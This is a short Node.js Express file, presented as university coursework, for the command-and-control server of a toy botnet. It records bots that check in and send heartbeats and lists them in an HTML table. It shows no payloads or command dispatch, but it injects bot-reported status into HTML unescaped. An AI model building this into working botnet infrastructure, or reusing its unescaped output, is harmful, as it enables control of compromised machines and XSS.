/*
Description: This is the 'host'(Command and control) side of the 'botnet', designed to send out commands and such.
Disclaimer: This is NOT a real C&C server nor is it used as such, nor would it be very good at handling a botnet in the real world.
			This is simply an example built for university coursework.
*/

var express = require('express');
var app = express();
var bodyParser = require("body-parser");
//To deal with POSTs because we're not a big fan of GETs
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

//Some global vars
var bots = [];

//*****Express routing*****
app.get('/', function (req, res) {
  res.writeHead(200,{"Content-Type" : "text/html"}); //Forcing HTML instead of text
  res.write('<h1>C&C Server Online</h1>\n');
  res.write(genTable());
  res.end();
});

//When we get a post request to /new, we know one of our bots is contacting us
app.post('/new', function(req, res) {
	var bot = {
		ip: req.ip, //This is based off of what WE see when the bot contacts us
		online: true, //We can assume this
		status: req.body.status, //This is part of the post that they send us
		lastHeartbeat: Date().toLocaleString()
	};
	handleNew(bot);
	res.send("pong");
});

//Our bots will intermittently send heartbeats so we know they're online still, and update their status
app.post('/heartbeat', function(req, res) {
	//Look through known bots and update their status based on IP
	for (var i = 0; i < bots.length; i++) {
		if (bots[i].ip == req.ip) {
			bots[i].status = req.body.status;
		}
	}
	res.send("pong");
});

//This might not actually be a new bot, it could have just restarted, so let's handle that
function handleNew(newBot) {
	var found = false;
	for (var i = 0; i < bots.length; i++) {
		if (bots[i].ip == newBot.ip) {
			found = true;
		}
	}
	if (!found) {
		bots.push(newBot);
	}
}

//Table generation using some helper functions
function genTable() {
	var tableHTML = headerTable;
	for (var i = 0; i < bots.length; i++) {
		tableHTML += tableContentGen(bots[i].ip, bots[i].online, bots[i].status, bots[i].lastHeartbeat);
	}
	tableHTML += footerTable;
	return tableHTML;
}

//Start the server
app.listen(3000, function () {
  	console.log('C&C Server Online, waiting for bots');
});

//Templates and table gens
var headerTable = `
<table border="1">
  <tr>
    <th>IP</th>
    <th>Online</th>
    <th>Status</th>
    <th>Last Heartbeat</th>
  </tr>
`;
function tableContentGen(ip, online, status, lhb) {
	return ` 
	<tr>
    <td>${ip}</td>
    <td>${online}</td>
    <td>${status}</td>
    <td>${lhb}</td>
  </tr>`
}
var footerTable = "</table>";